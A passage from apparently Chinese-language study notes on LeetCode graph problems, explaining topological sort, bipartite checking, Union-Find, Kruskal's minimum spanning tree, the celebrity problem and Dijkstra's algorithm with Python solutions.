range(numCourses) if in_degrees[i] == 0] # 遍历所有零优先级课程 for course in zero_indegree_courses: for adjacent_course in adjacency_list[course]: # 将该课程对应的后续课程的优先级减一 in_degrees[adjacent_course] -= 1 # 当该后续课程优先级为零时将其加入结果列表 if in_degrees[adjacent_course] == 0: zero_indegree_courses.append(adjacent_course) # 最后返回零优先级课程列表 # 如果存在环，则零优先级列表的元素数量一定低于课程数量 # 因为环上的所有课程优先级至少为一，无法减为零 return zero_indegree_courses if len(zero_indegree_courses) == numCourses else []参考：拓扑排序，YYDS！785. Is Graph Bipartite?这道题涉及的知识是图论里的二分图定义。什么是二分图？百度百科定义如下： 二分图的顶点集可分割为两个互不相交的子集，图中每条边依附的两个顶点都分属于这两个子集，且两个子集内的顶点不相邻。其实该定义等价于「双色问题」： 如果一个图是二分图，当且仅当可以只用两种颜色将图中的所有顶点着色，且使得任意一条边的两个端点的颜色都不相同。所以这道题的思路就比较简单，我们可以一边遍历图一遍进行染色，碰到遍历过的节点就比较其颜色和当前节点是否相同。这里提供 DFS 和 BFS 两种方法：DFS:class Solution: def isBipartite(self, graph: List[List[int]]) -&amp;gt; bool: n = len(graph) # visited 数据： -1 未访问，0 和 1 分别代表两种颜色 visited = [-1 for _ in range(n)] # 是否染色失败 fail = False # DFS 递归函数 def traverse(node, color): nonlocal fail if fail: return # 染色 visited[node] = color # 访问该节点每一个邻居节点 for neighbor in graph[node]: if visited[neighbor] == color: # 如果邻居节点访问过且颜色和当前节点相同，则判定失败 fail = True return if visited[neighbor] == -1: # 如果未访问则调用递归 traverse(neighbor, 1- color) # 对每一个节点都调用一次递归 for node in range(n): if visited[node] == -1: traverse(node, 0) return not failBFS:class Solution: def isBipartite(self, graph: List[List[int]]) -&amp;gt; bool: n = len(graph) # 这里存储访问状态和颜色的数组要分开 visited = [False for _ in range(n)] colors = [False for _ in range(n)] # 辅助 BFS 的队列 queue = [] for node in range(n): # 对未访问的节点进行遍历 if not visited[node]: queue.append(node) while len(queue) != 0: # 从队列取出节点 node = queue.pop(0) # 标记访问 visited[node] = True for neighbor in graph[node]: if visited[neighbor]: # 如果邻居节点访问过，则进行颜色判定 if colors[node] == colors[neighbor]: return False else: # 未访问则染色，且把邻居节点加入队列 colors[neighbor] = not colors[node] queue.append(neighbor) return True参考：二分图判定886. Possible Bipartition和上一题一样的思路，就是多一步构建graph的过程。class Solution: def possibleBipartition(self, n: int, dislikes: List[List[int]]) -&amp;gt; bool: # 创建图 graph = [[] for _ in range(n)] for dislike in dislikes: graph[dislike[0]-1].append(dislike[1]-1) graph[dislike[1]-1].append(dislike[0]-1) # 直接返回上一题的二分图解法 return self.isBipartite(graph) def isBipartite(self, graph: List[List[int]]) -&amp;gt; bool: # ... 参考上一题323. Number of Connected Components in an Undirected Graph这一题考察的是 Union-Find 算法，也就是「并查集算法」的使用，主要用于解决图论中的「动态连通性」问题的。动态连通性在图论中，动态连通性主要指的是实现一种数据结构，能够满足以下需求： Given a set of N objects.Union command: connect two objects.Find/connected query: is there a path connecting the two objects?即能够实现检查两个节点是否连通，同时可以在任意两个不连通的节点之间添加连接。所以 Union-Find 算法主要需要实现这两个 API：class UF: # ... # 将 p 和 q 连接 def union(self, p: int, q: int) -&amp;gt; None: # 判断 p 和 q 是否连通# 判断 p 和 q 是否连通 def connected(self, p:int, q: int) -&amp;gt; bool: # 返回图中有多少个连通分量 def count(self) -&amp;gt; int:这里所说的「连通」是一种等价关系，具有如下三个性质：1、自反性：节点p和p是连通的。2、对称性：如果节点p和q连通，那么q和p也连通。3、传递性：如果节点p和q连通q和r连通，那么p和r也连通。从「连通」的概念我们可以推出「连通分量」的概念，即所有连通的节点构成的集合称为一个连通分量。动态连通性问题的实际应用很多，比如：检查通信网络中计算机之间是否连通、电子电路中的触点是否连接或者社交网络中的人是否相识等等。至此我们也搞清楚了，「并查集」中的「并」的意思，就是连接、合并两个连通分量；「查」就是查找判断两个节点是否属于一个连通分量。Union-Find 算法的关键就在于 union 和 connected 函数的效率。数据结构我们使用树结构来表示每一个连通分量，其中数的节点就是图的节点，实现的具体数据结构是数组。我们规定每一个节点有一个指针指向其父节点，表示该节点和父节点连通，如果没有父节点，则指向自己。那么一个连通分量内的所有节点都共享一个根节点，该根节点也就代表了整个连通分量。现在假设有N个节点，数组的第i个元素则代表节点i所指向的父节点的索引，于是我们就可以用一个数组来表示整个随机分量的森林了：class UF: # 构造函数 def __init__(self, n: int): # 一开始互不连通 self.__count = n # 父节点指针初始指向自己 self.parent = [i for i in range(n)] # 将 p 和 q 连接 def union(self, p: int, q: int) -&amp;gt; None: # 判断 p 和 q 是否连通# 判断 p 和 q 是否连通 def connected(self, p:int, q: int) -&amp;gt; bool: # 返回图中有多少个连通分量 def count(self) -&amp;gt; int: return self.__count如果某两个节点被连通，则让其中的（任意）一个节点的根节点接到另一个节点的根节点上： # 将 p 和 q 连接 def union(self, p: int, q: int) -&amp;gt; None: rootP = self.find(p) rootQ = self.find(q) if (rootP != rootQ): # 合并两棵树 self.parent[rootP] = rootQ # 分量数减一 self.__count -= 1 # 返回某个节点的根节点 def find(self, x: int) -&amp;gt; int: # 根节点的parent等于它自己 while(self.parent[x] != x): x = self.parent[x] return x判断节点 p 和 q 是否连通，只要检查它们是否拥有相同的根节点即可： # 判断 p 和 q 是否连通# 判断 p 和 q 是否连通 def connected(self, p:int, q: int) -&amp;gt; bool: rootP = self.find(p) rootQ = self.find(q) return rootP == rootQ至此， Union-Find 算法基本完成。其复杂度主要取决于connected和union两个 API 的复杂度，而这两个 API 的复杂度主要取决于 find 函数的复杂度，而 find 函数的复杂度则取决于树的大小和平衡情况。在最坏情况下一棵树会退化成一个链表，而此时find函数需要寻找到根节点就需要遍历整棵树， 时间复杂度为$O(N)$。对于社交网络等一些数据规模庞大的对象，这样的复杂度是十分不理想的。因此我们需要在生成树的过程做一些优化改进，使得生成的树结构更加平衡。算法改进 1. 加权添加一个weight数组，记录每一课树的“重量”，其实也就是节点数量，代表树的权重。在union函数中，总是让权重小的树的根节点指向权重大的树的根节点，这样可以一定程度上保证树结构的平衡性。这一优化可以使得时间复杂度降低到$O(logN)$左右。class UF: # 构造函数 def __init__(self, n: int): # 一开始互不连通 self.__count = n # 父节点指针初始指向自己 self.parent = [i for i in range(n)] # 初始权重都是 1 self.weight = [1 for i in range(n)] # 将 p 和 q 连接 def union(self, p: int, q: int) -&amp;gt; None: rootP = self.find(p) rootQ = self.find(q) if rootP == rootQ: return # 合并两棵树 # 小树接到大树下面，更平衡 if self.weight[rootP] &amp;lt; self.weight[rootQ]: self.parent[rootP] = rootQ self.weight[rootQ] += self.weight[rootP] else: self.parent[rootQ] = rootP self.weight[rootP] += self.weight[rootQ] # 分量数减一 self.__count -= 1算法改进 2. 路径压缩在find函数中加上一行代码： # 返回某个节点的根节点 def find(self, x: int) -&amp;gt; int: # 根节点的parent等于它自己 while(self.parent[x] != x): # 路径压缩 self.parent[x] = self.parent[self.parent[x]] x = self.parent[x] return x每一次find函数执行过程中，都可以压缩树结构，使得同一个连通分量里的每一个节点都直接指向其根节点。在这样一个平的树的结构下，时间复杂度可以降低到$O(1)$。最终代码class UF: # 构造函数 def __init__(self, n: int): # 一开始互不连通 self.__count = n # 父节点指针初始指向自己 self.parent = [i for i in range(n)] # 初始权重都是 1 self.weight = [1 for i in range(n)] # 将 p 和 q 连接 def union(self, p: int, q: int) -&amp;gt; None: rootP = self.find(p) rootQ = self.find(q) if rootP == rootQ: return # 合并两棵树 # 小树接到大树下面，更平衡 if self.weight[rootP] &amp;lt; self.weight[rootQ]: self.parent[rootP] = rootQ self.weight[rootQ] += self.weight[rootP] else: self.parent[rootQ] = rootP self.weight[rootP] += self.weight[rootQ] # 分量数减一 self.__count -= 1 # 判断 p 和 q 是否连通# 判断 p 和 q 是否连通 def connected(self, p:int, q: int) -&amp;gt; bool: rootP = self.find(p) rootQ = self.find(q) return rootP == rootQ # 返回图中有多少个连通分量 def count(self) -&amp;gt; int: return self.__count # 返回某个节点的根节点 def find(self, x: int) -&amp;gt; int: # 根节点的parent等于它自己 while(self.parent[x] != x): # 路径压缩 self.parent[x] = self.parent[self.parent[x]] x = self.parent[x] return xclass Solution: def countComponents(self, n: int, edges: List[List[int]]) -&amp;gt; int: uf = UF(n) for edge in edges: uf.union(edge[0], edge[1]) return uf.count()参考资料:UNION-FIND算法详解算法4（Algorithms4）- Part 1 动态连通性（Dynamic Connectivity）1200. 岛屿数量这道题可以有两种思路， 简单的 DFS 或者 BFS，思路是遍历整个 grid，碰到一个 &quot;1&quot; 之后就调用 DFS 或者 BFS 遍历相邻的所有其他 &quot;1&quot;。访问过的 &quot;1&quot; 需要做上标记，可以使用 visited 数组或者直接在原矩阵中将其改为 &quot;0&quot;。这样最终岛屿的数量就是调用 DFS / BFS 的次数。 使用并查集，但是在生成并查集类的时候，要首先根据 grid 初始化 parent 数组，将所有 &quot;0&quot; 的 parent 初始化为统一的 -1， 然后根据 &quot;1&quot; 的数量来决定初始的树的数量，也就说是一个只针对一个元素的并查集。BFS / DFS 代码：class Solution: def numIslands(self, grid: List[List[str]]) -&amp;gt; int: # 高度和宽度 m, n = len(grid), len(grid[0]) visited = [[False]*n for _ in range(m)] num_islands = 0 # 遍历网格 for i in range(m): for j in range(n): if grid[i][j] == &quot;1&quot; and not visited[i][j]: # 如果该块为陆地且未访问则发现新大陆 # 调用 bfs 且岛屿数量 +1 self.bfs(grid, visited, (i,j)) num_islands += 1 return num_islands def bfs(self, grid, visited, start): # 只要踩上了一块土地，整块大陆就会被标记访问过 m, n = len(grid), len(grid[0]) queue = [start] while queue: i, j = queue.pop(0) if visited[i][j]: continue visited[i][j] = True for i_next, j_next in [(i+1,j), (i, j+1), (i-1, j), (i, j-1)]: if (0 &amp;lt;= i_next &amp;lt; m) and (0 &amp;lt;= j_next &amp;lt; n) and grid[i_next][j_next] == &quot;1&quot; and not visited[i_next][j_next]: queue.append((i_next, j_next))并查集实现方法的代码：class UF: def __init__(self, grid): # 根据 grid 生成 parent 数组 m, n = len(grid), len(grid[0]) self.parent = [-1] * (m * n) self.weight = [1] * (m * n) self.count = 0 for i in range(m): for j in range(n): if grid[i][j] == &quot;1&quot;: self.parent[i * n + j] = i * n + j self.count += 1 def connected(self, node_1, node_2): root_1 = self.find(node_1) root_2 = self.find(node_2) return root_1 == root_2 def union(self, node_1, node_2): if self.connected(node_1, node_2): return root_1 = self.find(node_1) root_2 = self.find(node_2) if self.weight[root_1] &amp;lt; self.weight[root_2]: root_1, root_2 = root_2, root_1 self.parent[root_2] = root_1 self.weight[root_1] += self.weight[root_2] self.count -= 1 def find(self, node): while (self.parent[node] != node): self.parent[node] = self.parent[self.parent[node]] node = self.parent[node] return nodeclass Solution: def numIslands(self, grid: List[List[str]]) -&amp;gt; int: # 高度和宽度 m, n = len(grid), len(grid[0]) # 初始化 Union-Find 类，多一个留给水源 uf = UF(grid) # 遍历岛屿 for i in range(m): for j in range(n): if grid[i][j] == &quot;1&quot;: # 当判断为陆地时，检查附近的格子 # 只需要判断右边和下边的格子是因为这样足够可以检查到所有的边了 for i_next, j_next in [(i + 1, j), (i, j + 1)]: if (i_next &amp;lt; m ) and (j_next &amp;lt; n ) and grid[i_next][j_next] == &quot;1&quot;: node_1 = i * n + j node_2 = i_next * n + j_next # 连接 uf.union(node_1, node_2) return uf.count130. Surrounded Regions第 130 题，被围绕的区域：给你一个 M × N 的二维矩阵，其中包含字符 X 和 O，让你找到矩阵中四面被 X 围住的 O，并且把它们替换成 X。根据题意，四面，不包括斜角，因此边和角上的O一定不会被围住。所以这道题的基本思路是从边角上的O出发，找到跟这些O连通的其他O，替换剩下的O即可。具体有两种方法，第一种是正常的 DFS 的方案，先用 for 循环遍历棋盘的四边，用 DFS 算法把那些与边界相连的O换成一个特殊字符，比如#；然后再遍历整个棋盘，把剩下的O换成X，把#恢复成O。这样就能完成题目的要求，时间复杂度$O(MN)$:class Solution: def solve(self, board: List[List[str]]) -&amp;gt; None: &quot;&quot;&quot; Do not return anything, modify board in-place instead. &quot;&quot;&quot; # 获取棋盘的宽高 m = len(board) n = len(board[0]) visited = [[False] * n for _ in range(m)] # 深度优先遍历 def dfs(i,j): # 不符合范围的索引或者访问过的节点直接返回 if i &amp;lt; 0 or i &amp;gt; m-1: return if j &amp;lt; 0 or j &amp;gt; n-1: return if visited[i][j]: return # 前序遍历操作 visited[i][j] = True # 仅当目前为止为&#39;O&#39;时继续递归 if board[i][j] == &#39;O&#39;: # 将&#39;O&#39;替换成&#39;#&#39; board[i][j] = &#39;#&#39; # 遍历与其直接相邻的其他节点 dfs(i+1, j) dfs(i-1, j) dfs(i, j+1) dfs(i, j-1) else: return # 对所有边角的&#39;O&#39;调用dfs for i in range(m): dfs(i, 0) dfs(i, n-1) for j in range(n): dfs(0, j) dfs(m-1, j) # 将&#39;#&#39;替换回&#39;O&#39;，将剩下的&#39;O&#39;换成&#39;X&#39; for i in range(m): for j in range(n): if board[i][j] == &#39;O&#39;: board[i][j] = &#39;X&#39; elif board[i][j] == &#39;#&#39;: board[i][j] = &#39;O&#39;第二种方法，就是使用上一题提到的 Union-Find 算法解决，虽然实现复杂一些，甚至效率也略低，但这是使用 Union-Find 算法的通用思想，值得一学。在这道题中，这些O就是单独的节点，「连通性」就是指节点与节点之间是否是直接相邻。那么我们就可以直接使用上一题的代码来解决这个问题，只要首先创建一个虚拟头节点dummy，然后将所有的边角上的O都指向该节点，那么这些节点都归属于同一个连通分量了。再将所有的O和其邻接的O连通，所有的O就会分属于不同的连通分量，而和dummy处在同一个连通分量里的O都不需要替换；替换其他O即可。最后剩下的问题就是，怎么把二维的数据投射到一维的数组上，最简单常用的方法就是parent[i × n + j] = board[i][j]其中n是board的宽度，也就是索引j对应的上限。然后让我们的虚拟头指针占用索引m × n，我们刚好需要构建一个大小为m × n + 1的数组。参考代码：class UF: # Union-Find 的实现 # 参考上题 # ...class Solution: def solve(self, board: List[List[str]]) -&amp;gt; None: &quot;&quot;&quot; Do not return anything, modify board in-place instead. &quot;&quot;&quot; m = len(board) n = len(board[0]) # 给dummy留一个位置 uf = UF(m * n + 1) # 定义虚拟头节点 dummy = m * n # 将首行和末行的&#39;O&#39;和dummy连通 for i in range(m): uf.union(i*n, dummy) uf.union(i*n + n - 1, dummy) # 将首列和末列的`O`和dummy连通 for j in range(n): uf.union(j, dummy) uf.union((m-1)*n + j, dummy) # 定义方向数组 directions = [(0,1), (1,0), (-1,0), (0,-1)] # 遍历连通所有的&#39;O&#39; for i in range(1, m-1): for j in range(1, n-1): if board[i][j] == &#39;O&#39;: curr_node = i * n + j # 将该&#39;O&#39;和上下左右的&#39;O&#39;连通 for dir_i, dir_j in directions: if board[i+dir_i][j+dir_j] == &#39;O&#39;: neighbor = curr_node + dir_i * n + dir_j uf.union(curr_node, neighbor) # 将所有不和dummy连通的&#39;O&#39;改为&#39;X&#39; for i in range(1, m-1): for j in range(1, n-1): if board[i][j] == &#39;O&#39;: curr_node = i * n + j if not uf.connected(curr_node, dummy): board[i][j] = &#39;X&#39;参考文章：UNION-FIND算法应用990. Satisfiability of Equality Equations这一题使用 Union-Find 算法解就比较优雅了。题目给定一个数组equations，装着若干字符串表示的算式。每个算式equations[i]长度都是 4，而且只有等式或不等式两种情况：a==b或者a!=b，其中 a,b 可以是任意小写字母。算法要求是，如果equations中所有算式都不会互相冲突，返回true，否则返回false。思路很明显，等式即是一种最简单的等价关系，满足自反性、对称性和传递性三种性质，a==b就等价于a和b连通。因此把 26 个字母作为节点，相等关系作为连通性，首先处理所有的等式划分好连通分量，然后使用不等式去验证关系即可：class UF: # Union-Find 的实现 # 参考上上题 # ...class Solution: def equationsPossible(self, equations: List[str]) -&amp;gt; bool: # 一共有26个字母 uf = UF(26) # 暂存&#39;a&#39;的 ASCII 码 id_a = ord(&#39;a&#39;) # 首先根据等式构建连通分量 for eq in equations: if eq[1] == &#39;=&#39;: # 连通等式两端两个字母对应的节点 uf.union(ord(eq[0])-id_a, ord(eq[3])-id_a) # 遍历不等式进行验证 for eq in equations: # 如果不等式两端字母连通则说明矛盾 if eq[1] == &#39;!&#39; and uf.connected(ord(eq[0])-id_a, ord(eq[3])-id_a): return False return True参考文章：UNION-FIND算法应用KRUSKAL 最小生成树算法最小生成树算法主要有 Prim 算法和 Kruskal 算法两种，这两种算法都运用了贪心思想，但从实现上来说存在挺大差异，本部分主要使用的 Kruskal 算法Kruskal 算法其实很容易理解和记忆，其关键是要熟悉并查集算法，如果不熟悉，建议先看下前几道题的 Union-Find 并查集算法。最小生成树定义「树」和「图」的根本区别：树不会包含环，图可以包含环。如果一幅图没有环，完全可以用一棵树的形式来表示。专业点说，树就是「无环连通图」。图的「生成树」就是在图中找一棵包含图中的所有节点的树。专业点说，生成树是含有图中所有顶点的「无环连通子图」。对于加权图，每条边都有权重，所以每棵生成树都有一个权重和。那么「最小生成树」就很好理解了，在所有可能的生成树中，权重和最小的那棵生成树就叫「最小生成树」。 一般来说，我们都是在无向加权图的情境下计算最小生成树的，所以现实场景中，图的边权重一般代表成本、距离这样的标量。Union-Find 并查集算法图的生成树是含有其所有顶点的「无环连通子图」，最小生成树是权重和最小的生成树。Union-Find 并查集算法，是用来用来高效处理图中连通分量的问题。Union-Find 并查集算法的实现可以参考前几道题，主要运用size数组和路径压缩技巧提高算法效率。Kruskal 算法所谓最小生成树，就是图中若干边的集合（后文称为mst，最小生成树的英文缩写），算法要保证这些边： 包含图中的所有节点。 形成的结构是树结构（即不存在环）。 权重和最小。 Union-Find 算法主要负责做到前两条，关键在于第 3 点，如何保证得到的这棵生成树权重和最小。这里主要用到的是贪心思路：将所有边按照权重从小到大排序，从权重最小的边开始遍历，如果这条边和mst中的其他边不会形成环，则这条边是最小生成树的一部分，将它加入mst集合；否则，这条边不是最小生成树的一部分，不加入mst集合。按照这个思路，最后mst集合中的边就形成了最小生成树。下面用三个例题来应用 Kruskal 算法。261. Graph Valid Tree这道题其实就是判断一张无向图中是否有环。遍历所有的边，首先判断边的两个节点是否在同一个连通分量中，如果是，则这条边的建立会形成环，返回False。遍历完成之后连通分量的数量就是树的数量，所以最后需要检查连通分量的数量是否为 1。class UF: # 参考 Union-Find 算法部分class Solution: def validTree(self, n: int, edges: List[List[int]]) -&amp;gt; bool: uf = UF(n) # 遍历所有边 for edge in edges: if uf.connected(edge[0], edge[1]): # 如果两个节点已经连通，则会产生环 return False else: # 否则，连通两个节点 uf.union(edge[0], edge[1]) # 保证最后只剩一个连通分量，所有节点都在一棵树里 return uf.count() == 11135. Connecting Cities With Minimum Cost这道题就可以转换为无向加权图中的最小生成树计算问题了，城市就是节点，而成本就是边的权重。class UF: # 参考 Union-Find 算法部分class Solution: def minimumCost(self, n: int, connections: List[List[int]]) -&amp;gt; int: connections = sorted(connections, key=lambda x: x[2]) uf = UF(n) min_cost = 0 for city1, city2, cost in connections: if not uf.connected(city1-1, city2-1): # 如果两个城市未连通，则连通这条边 uf.union(city1-1, city2-1) min_cost += cost # 最后检查所有城市是否是连通的 if uf.count() &amp;gt; 1: return -1 return min_cost1584. Min Cost to Connect All Points这道题和上一题的区别就在于边需要自己生成，但是也并不难。遍历生成所有的边，然后直接应用 Kruskal 算法即可。唯一的问题就是在这里点的坐标只是用来计算成本的，在数据结构中还是用输入列表里的索引来表示。class UF: # 参考 Union-Find 算法部分class Solution: def minCostConnectPoints(self, points: List[List[int]]) -&amp;gt; int: # 计算点的数量 n = len(points) uf = UF(n) # 遍历生成带权重的边 edges = [] for i in range(n): for j in range(i+1, n): xi, yi = points[i] xj, yj = points[j] distance = abs(xj - xi) + abs(yj - yi) edges.append((i, j, distance)) # 对边按照权重进行排序 edges = sorted(edges, key=lambda x: x[2]) # 贪心算法 min_cost = 0 for point1, point2, cost in edges: if not uf.connected(point1, point2): # 如果两个点没有连通，则将连通该条边 uf.union(point1, point2) min_cost += cost return min_cost277. Find the Celebrity题目提供n个人之间的社交关系（两个人之间是否认识），设计算法找出这些人中的「名人」。所谓「名人」有两个条件： 所有其他人都认识「名人」； 「名人」不认识其他任何人。 这是一个比较贴近实际的图相关的算法问题，社交关系，本质上可以抽象成一幅图。我们可以把每个人看做图中的节点，「认识」就可以看做是节点之间的有向边，相当于社交软件上的「关注」，那么名人就是该图中一个特殊的节点。题目提供了一个knows(i, j) API 来返回i是否认识j，本质上是在访问「邻接矩阵」。最终题目要求返回名人的索引，或者-1来表示没有名人的情况。暴力解法简单的思路就是进行暴力穷举，把每个人遍历一遍，判断他和其他人的关系，最后筛选出名人。时间优化可以简单根据两个人之间的认识关系来对名人的候选名单进行筛选。两个人之间的认识情况无非四种，以两个人i和j来举例： 如果i认识j，j不认识i，那么i一定不是名人； 如果i不认识j，j认识i，那么j一定不是名人； 如果两个互相认识，那么两个人都不是名人； 如果两个人互相不认识，那么两个人都不是名人。 根据如上四条逻辑，可以先任意比较n-1对人之间的关系，每次比较都能筛掉至少一个人，如果图里有名人，那么n-1次比较之后剩下的人一定是名人，然后我们验证一下最后这个人和其他所有人的关系即可。优化后时间复杂度为$O(N)$。空间优化根据上一条时间优化的结果，我们可以只设定两个变量cand和other，两者之间淘汰之后交替赋值即可。优化后空间复杂度为$O(1)$。参考代码# The knows API is already defined for you.# return a bool, whether a knows b# def knows(a: int, b: int) -&amp;gt; bool:class Solution: def findCelebrity(self, n: int) -&amp;gt; int: # 初始化候选人 cand cand = 0 # 遍历所有人 for other in range(1, n): if knows(cand, other): # 只需要验证 cand 是否认识 other # 如果认识，直接淘汰 cand # 否则，淘汰 other cand = other # 验证最后的 cand 是否是真正的名人 for other in range(n): if cand == other: # 跳过自己的情况 continue if (not knows(other, cand)) or knows(cand, other): # 如果存在 cand 认识其他人或者有人不认识 cand 的情况 # 返回 -1 return -1 return cand 参考链接：众里寻他千百度：名流问题DIJKSTRA 算法DIJKSTRA 算法 的输入是一幅图graph和一个起点start，目的是返回一个记录从 start 起点到所有节点的最短路径权重的数组。这种问题一般称作 单源最短路径 问题。函数签名如下：def dijkstra(start: int, graph: List[List[tuple[int]]]) -&amp;gt; List[int];其中graph的两种实现方式，邻接表和邻接矩阵均可，这里使用的是「带权重的邻接表」数据结构。只要能正确提供邻居节点和权重的信息即可。其实现代码如下：def dijkstra(start: int, graph: List[List[tuple[int]]]) -&amp;gt; List[int]: &#39;&#39;&#39; 输入一个起点 start，计算从 start 到其他节点的最短距离 Args: start: 输入的起点 graph: 包含权重的邻接表 Returns: 包含从 start 到其他节点的最短距离的列表 &#39;&#39;&#39; # 定义：distTo[i] 的值就是起点 start 到达节点 i 的最短路径权重 n = len(graph) dist_to = [float(&#39;inf&#39;) for _ in range(n)] # base case，start 到自己的距离为 0 dist_to[start] = 0 # 使用优先级队列决定节点遍历优先级，distFromStart 较小的排在前面 # 从起点开始 BFS pqueue = [(0, start)] heapify(pqueue) while pqueue: curr_state = heapq.heappop(pqueue) curr_node_id = curr_state[1] curr_dist_from_start = curr_state[0] if curr_dist_from_start &amp;gt; dist_to[curr_node_id]: continue # 将 curNode 的相邻节点装入队列 for neighbor in graph[curr_node_id]: neighbor_id = neighbor[0] dist_to_next_node = dist_to[curr_node_id] + neighbor[1] # 更新 dist_to 列表 if dist_to[neighbor_id] &amp;gt; dist_to_next_node: dist_to[neighbor_id] = dist_to_next_node heapq.heappush(pqueue, (dist_to_next_node, neighbor[0])) return dist_to保存路径权重该算法可以看作是一个 BFS 算法的加权图特化版。比起无权图中会使用visited数组记录节点的访问情况，加权图中因为不同路径走到同一个点的权重和会不同（即便运用了贪心思想），我们无法保证第一次访问某一节点时对应的路径就是最小权重的路径，所以没有必要再使用visited数组，取而代之的是需要保存每条路径的权重和，用于计算后续路径的权重，以及比较和更新从起点到某一节点的最小权重和。这里保存权重有很多种方法，参考链接提供了一种构造Stage类来存储节点node_id和到该节点的距离dist_from_start的方法。但是在 Python 里可以不构造类Stage，比如上面提供的代码，直接将元组(node_id, dist_from_start)加入队列就行了。优先级队列比起用在无权图上的 BFS，Dijkstra 算法使用优先级队列取代了普通队列，其好处是每次出队列的都是待选节点中距离起点最近的节点。也就是说，该算法每一步迈出的都是最小步子，延伸至最近的节点，事实上就是 BFS 的概念。如果不用优先级队列，Dijkstra 算法就不具备 BFS 的「广度优先」属性。这一特性保证了算法平等地开拓各条路径，这样就能更早找到权重最小路径，而越早发现权重最小路径，根据算法，就会有越多路径不需要遍历，就能节省更多时间。在上述代码中，优先级队列是用最小堆的数据结构实现的，使用的 Python 包是heapq包。只计算起点 start 到某一个终点 end 的最短路径脑子里过一遍 Dijkstra 算法，我们可以发现，在某一个节点i第一次入队列的时候，所对应的那条路径并不一定是最短路径。因为在节点i入队列的时候，遍历的是节点i当前路径上的前一个节点。我们设这个节点为i0，节点i0与起点的距离才是所有当前路径中的最小距离路径。因此从节点i0到节点i时，两者间的权重weight(i0, i)可能导致该条路径的总权重高于其他路径，也就是说，此时其他路径有可能能以更小的代价能到达节点i。而根据算法，接下来出队列的就会是那些距离起点更近的节点。总结就是，某节点第一次入队列的时候找到的不一定是最短路径，但是当该节点第一次出队列时，对应的dist_to_next_node就一定是最短路径了。因为是「第一次」出队列，所以目前路径中没有经过该节点的存在，而因为队列是优先级队列，所以该节点是目前路径中距离起点最近的路径，因此一定是最短路径。所以如果只计算起点 start 到某一个终点 end 的最短路径，代码只需要加一行：# 输入起点 start 和终点 end, 返回起点到终点的最短距离def dijkstra(start: int, end:int, graph: List[List[tuple[int]]]) -&amp;gt; int: # ... while pqueue: curr_dist_from_start, curr_node_id = heapq.heappop(pqueue) # 在这里加一个判断即可 if curr_node_id == end: return curr_dist_from_start if curr_dist_from_start &amp;gt; dist_to[curr_node_id]: continue # ... # 如果运行到这里，说明 start 无法走到 end return -1是否需要 Visited 数组？在网上看到有的 Dijkstra 算法里会加上visited数组，然后在节点出队列时记录访问，在入队的时候检查节点的访问情况，像下面这样：def dijkstra(start: int, graph: List[List[tuple[int]]]) -&amp;gt; List[int]: # ... # 初始化 visited 集合 visited = set() while pqueue: # ... # 如果访问过该节点则跳过 if curr_node_id in visited: continue # 出队的时候记录节点访问 visited.add(curr_node_id) if curr_dist_from_start &amp;gt; dist_to[curr_node_id]: continue # 将 curNode 的相邻节点装入队列 for neighbor in graph[curr_node_id]: neighbor_id = neighbor[0] # 如果访问过则不入队 if neighbor_id not in visited: dist_to_next_node = dist_to[curr_node_id] + neighbor[1] # 更新 dist_to 列表 if dist_to[neighbor_id] &amp;gt; dist_to_next_node: dist_to[neighbor_id] = dist_to_next_node heapq.heappush(pqueue, (dist_to_next_node, neighbor[0])) return dist_to事实上并没有必要，因为这和dist_to数组的应用是等价的。上个部分说到当某一节点第一次出队的时候，就说明得到了从起点到该节点的权重最小路径。而在每一个节点出队的时候，我们都有一个条件判断 if curr_dist_from_start &amp;gt; dist_to[curr_node_id]: continue来判断当前路径是否大于最小路径，事实上等价于判断该节点是否访问过了。在之后邻居节点入队的条件判断 if dist_to[neighbor_id] &amp;gt; dist_to_next_node: dist_to[neighbor_id] = dist_to_next_node heapq.heappush(pqueue, (dist_to_next_node, neighbor[0]))也是同样的道理，一旦访问过该节点，那么其对应的最小权重路径已经找到，其在dist_to里的值一定是最小值，因此该判断一定为否，相当于存在于visited数组里了。即便使用了visited数组，节点还是有可能会被多次访问的，这取决于图的具体情况。所以用visited数组稍微有点误导性。而这里我们可以看到dist数组的更新是在节点入队的时候就完成了。结合入队的判断条件可以在该节点入队后出队前减少一些该节点重复入队的情况，故而避免不必要的堆排序，比起使用visited数组的方法时间消耗更少。时间复杂度分析Dijkstra 算法的复杂度随着其内部数据结构的实现的不同而不同。假设图中的节点数量为V，边的数量为E，代码中的优先队列是用二叉堆实现的。那么由于在最差情况下，节点可能会重复进队，而这个队列内元素数量则和边的数量成正比，因此构造二叉堆的时间复杂度就是$O(Elog(E))$。同时邻接表中所有的边的信息都会被遍历一遍，因此总的时间复杂度就是：$O(E+Elog(E))=O(Elog(E))$参考链接我写了一个模板，把 DIJKSTRA 算法变成了默写题743. Network Delay Time这道题就是很简单的 Dijkstra 算法的应用，其中的优先级队列的实现是用 Python 中的 heapq 库，速度更快一些。根据题目输入构造完图的邻接表之后，找到所有节点距离起点最远的那一个，就是所有节点连通的时间了。def dijkstra(start: int, graph: List[List[tuple[int]]]) -&amp;gt; List[int]: &#39;&#39;&#39; 输入一个起点 start，计算从 start 到其他节点的最短距离 Args: start: 输入的起点 graph: 包含权重的邻接表 Returns: 包含从 start 到其他节点的最短距离的列表 &#39;&#39;&#39; # 定义：distTo[i] 的值就是起点 start 到达节点 i 的最短路径权重 n = len(graph) dist_to = [float(&#39;inf&#39;) for _ in range(n)] # base case，start 到自己的距离为 0 dist_to[start] = 0 # 使用优先级队列决定节点遍历优先级，distFromStart 较小的排在前面 # 从起点开始 BFS pqueue = [(0, start)] heapify(pqueue) while pqueue: curr_dist_from_start, curr_node_id = heapq.heappop(pqueue) if curr_dist_from_start &amp;gt; dist_to[curr_node_id]: continue # 将 curNode 的相邻节点装入队列 for neighbor in graph[curr_node_id]: neighbor_id = neighbor[0] dist_to_next_node = dist_to[curr_node_id] + neighbor[1] # 更新 dist_to 列表 if dist_to[neighbor_id] &amp;gt; dist_to_next_node: dist_to[neighbor_id] = dist_to_next_node heapq.heappush(pqueue, (dist_to_next_node, neighbor[0])) return dist_toclass Solution: def networkDelayTime(self, times: List[List[int]], n: int, k: int) -&amp;gt; int: # 构造邻接表 # 因为节点编号从 1 开始，表大小为 n + 1 graph = [[] for _ in range(n+1)] for time in times: graph[time[0]].append((time[1], time[2])) # 调用 dijkstra 算法计算以节点 k 为起点到其他节点的最短路径 dist_to = dijkstra(k, graph) # 找到最长的路径 res = 0 for dist in dist_to[1:]: if dist == 